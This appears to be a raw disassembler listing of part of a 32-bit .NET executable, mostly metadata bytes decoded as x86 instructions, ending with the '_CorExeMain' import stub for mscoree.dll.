  40c1b4:	02 12                	add    (%edx),%dl
  40c1b6:	81 85 0e 06 20 01 12 	addl   $0xe858112,0x120060e(%ebp)
  40c1bd:	81 85 0e 
  40c1c0:	07                   	pop    %es
  40c1c1:	20 02                	and    %al,(%edx)
  40c1c3:	12 81 85 0e 02 12    	adc    0x12020e85(%ecx),%al
  40c1c9:	07                   	pop    %es
  40c1ca:	06                   	push   %es
  40c1cb:	12 20                	adc    (%eax),%ah
  40c1cd:	0e                   	push   %cs
  40c1ce:	08 12                	or     %dl,(%edx)
  40c1d0:	80 c9 15             	or     $0x15,%cl
  40c1d3:	11 81 41 01 12 20    	adc    %eax,0x20120141(%ecx)
  40c1d9:	12 20                	adc    (%eax),%ah
  40c1db:	10 10                	adc    %dl,(%eax)
  40c1dd:	01 01                	add    %eax,(%ecx)
  40c1df:	15 12 31 01 1e       	adc    $0x1e013112,%eax
  40c1e4:	00 15 12 81 d1 01    	add    %dl,0x1d18112
  40c1ea:	1e                   	push   %ds
  40c1eb:	00 04 0a             	add    %al,(%edx,%ecx,1)
  40c1ee:	01 12                	add    %edx,(%edx)
  40c1f0:	20 05 20 01 02 13    	and    %al,0x13020120
  40c1f6:	00 03                	add    %al,(%ebx)
  40c1f8:	07                   	pop    %es
  40c1f9:	01 1c 05 00 00 12 82 	add    %ebx,-0x7dee0000(,%eax,1)
  40c200:	05 07 20 01 12       	add    $0x12012007,%eax
  40c205:	82 09 1d             	orb    $0x1d,(%ecx)
  40c208:	05 06 20 01 12       	add    $0x12012006,%eax
  40c20d:	82 0d 0e 06 00 01 1c 	orb    $0x1c,0x100060e
  40c214:	12 82 0d 08 00 01    	adc    0x100080d(%edx),%al
  40c21a:	12 82 0d 11 82 15    	adc    0x1582110d(%edx),%al
  40c220:	09 00                	or     %eax,(%eax)
  40c222:	02 12                	add    (%edx),%dl
  40c224:	82 19 11             	sbbb   $0x11,(%ecx)
  40c227:	82 1d 0e 1c 00 05 12 	sbbb   $0x12,0x5001c0e
  40c22e:	82 25 11 82 29 0e 15 	andb   $0x15,0xe298211
  40c235:	12 81 d1 01 12 82    	adc    -0x7dedfe2f(%ecx),%al
  40c23b:	0d 12 82 0d 15       	or     $0x150d8212,%eax
  40c240:	12 81 d1 01 12 82    	adc    -0x7dedfe2f(%ecx),%al
  40c246:	19 17                	sbb    %edx,(%edi)
  40c248:	15 12 55 01 15       	adc    $0x15015512,%eax
  40c24d:	12 59 0a             	adc    0xa(%ecx),%bl
  40c250:	12 5d 1c             	adc    0x1c(%ebp),%bl
  40c253:	12 0d 12 09 0e 1d    	adc    0x1d0e0912,%cl
  40c259:	05 12 4d 0e 0e       	add    $0xe0e4d12,%eax
  40c25e:	0e                   	push   %cs
  40c25f:	0b 00                	or     (%eax),%eax
  40c261:	01 15 12 55 01 13    	add    %edx,0x13015512
  40c267:	00 12                	add    %dl,(%edx)
  40c269:	82 25 03 06 13 00 13 	andb   $0x13,0x130603
  40c270:	15 12 59 0a 12       	adc    $0x120a5912,%eax
  40c275:	5d                   	pop    %ebp
  40c276:	1c 12                	sbb    $0x12,%al
  40c278:	0d 12 09 0e 1d       	or     $0x1d0e0912,%eax
  40c27d:	05 12 4d 0e 0e       	add    $0xe0e4d12,%eax
  40c282:	0e                   	push   %cs
  40c283:	17                   	pop    %ss
  40c284:	20 0a                	and    %cl,(%edx)
  40c286:	01 13                	add    %edx,(%ebx)
  40c288:	00 13                	add    %dl,(%ebx)
  40c28a:	01 13                	add    %edx,(%ebx)
  40c28c:	02 13                	add    (%ebx),%dl
  40c28e:	03 13                	add    (%ebx),%edx
  40c290:	04 13                	add    $0x13,%al
  40c292:	05 13 06 13 07       	add    $0x7130613,%eax
  40c297:	13 08                	adc    (%eax),%ecx
  40c299:	13 09                	adc    (%ecx),%ecx
  40c29b:	05 07 01 12 82       	add    $0x82120107,%eax
  40c2a0:	2d 07 20 03 01       	sub    $0x1032007,%eax
  40c2a5:	0e                   	push   %cs
  40c2a6:	1d 05 08 05 20       	sbb    $0x20050805,%eax
  40c2ab:	01 1d 05 08 12 07    	add    %ebx,0x7120805
  40c2b1:	06                   	push   %es
  40c2b2:	12 81 2d 12 82 39    	adc    0x3982122d(%ecx),%al
  40c2b8:	12 82 3d 12 82 41    	adc    0x4182123d(%edx),%al
  40c2be:	1d 05 1d 05 06       	sbb    $0x6051d05,%eax
  40c2c3:	20 01                	and    %al,(%ecx)
  40c2c5:	01 11                	add    %edx,(%ecx)
  40c2c7:	82 4d 06 20          	orb    $0x20,0x6(%ebp)
  40c2cb:	01 01                	add    %eax,(%ecx)
  40c2cd:	11 82 51 05 20 00    	adc    %eax,0x200551(%edx)
  40c2d3:	12 82 55 0b 20 03    	adc    0x3200b55(%edx),%al
  40c2d9:	01 12                	add    %edx,(%edx)
  40c2db:	39 12                	cmp    %edx,(%edx)
  40c2dd:	82 55 11 82          	adcb   $0x82,0x11(%ebp)
  40c2e1:	59                   	pop    %ecx
  40c2e2:	08 20                	or     %ah,(%eax)
  40c2e4:	03 1d 05 1d 05 08    	add    0x8051d05,%ebx
  40c2ea:	08 1a                	or     %bl,(%edx)
  40c2ec:	07                   	pop    %es
  40c2ed:	0a 12                	or     (%edx),%dl
  40c2ef:	81 2d 12 82 39 1d 05 	subl   $0x41821205,0x1d398212
  40c2f6:	12 82 41 
  40c2f9:	1d 05 1d 05 12       	sbb    $0x12051d05,%eax
  40c2fe:	82 3d 1d 05 1d 05 1d 	cmpb   $0x1d,0x51d051d
  40c305:	05 0c 00 05 01       	add    $0x105000c,%eax
  40c30a:	12 81 71 08 12 81    	adc    -0x7eedf78f(%ecx),%al
  40c310:	71 08                	jno    0x40c31a
  40c312:	08 04 07             	or     %al,(%edi,%eax,1)
  40c315:	02 02                	add    (%edx),%al
  40c317:	08 0e                	or     %cl,(%esi)
  40c319:	07                   	pop    %es
  40c31a:	06                   	push   %es
  40c31b:	1d 05 12 81 3d       	sbb    $0x3d811205,%eax
  40c320:	12 82 65 1d 05 08    	adc    0x8051d65(%edx),%al
  40c326:	05 07 07 02 12       	add    $0x12020707,%eax
  40c32b:	82 65 1d 05          	andb   $0x5,0x1d(%ebp)
  40c32f:	0f 07                	sysret
  40c331:	06                   	push   %es
  40c332:	12 81 2d 1d 05 08    	adc    0x8051d2d(%ecx),%al
  40c338:	12 82 69 1d 05 1d    	adc    0x1d051d69(%edx),%al
  40c33e:	05 08 20 02 01       	add    $0x1022008,%eax
  40c343:	12 39                	adc    (%ecx),%bh
  40c345:	11 82 6d 0c 07 04    	adc    %eax,0x4070c6d(%edx)
  40c34b:	12 81 2d 1d 05 12    	adc    0x12051d2d(%ecx),%al
  40c351:	82 69 1d 05          	subb   $0x5,0x1d(%ecx)
  40c355:	00 00                	add    %al,(%eax)
  40c357:	00 80 c3 00 00 00    	add    %al,0xc3(%eax)
  40c35d:	00 00                	add    %al,(%eax)
  40c35f:	00 00                	add    %al,(%eax)
  40c361:	00 00                	add    %al,(%eax)
  40c363:	00 9e c3 00 00 00    	add    %bl,0xc3(%esi)
  40c369:	20 00                	and    %al,(%eax)
	...
  40c37f:	00 90 c3 00 00 00    	add    %dl,0xc3(%eax)
	...
  40c391:	00 5f 43             	add    %bl,0x43(%edi)
  40c394:	6f                   	outsl  %ds:(%esi),(%dx)
  40c395:	72 45                	jb     0x40c3dc
  40c397:	78 65                	js     0x40c3fe
  40c399:	4d                   	dec    %ebp
  40c39a:	61                   	popa
  40c39b:	69 6e 00 6d 73 63 6f 	imul   $0x6f63736d,0x0(%esi),%ebp
  40c3a2:	72 65                	jb     0x40c409
  40c3a4:	65 2e 64 6c          	gs cs fs insb (%dx),%es:(%edi)
  40c3a8:	6c                   	insb   (%dx),%es:(%edi)
  40c3a9:	00 00                	add    %al,(%eax)
  40c3ab:	00 00                	add    %al,(%eax)
  40c3ad:	00 ff                	add    %bh,%bh
  40c3af:	25 00 20 40 00       	and    $0x402000,%eax
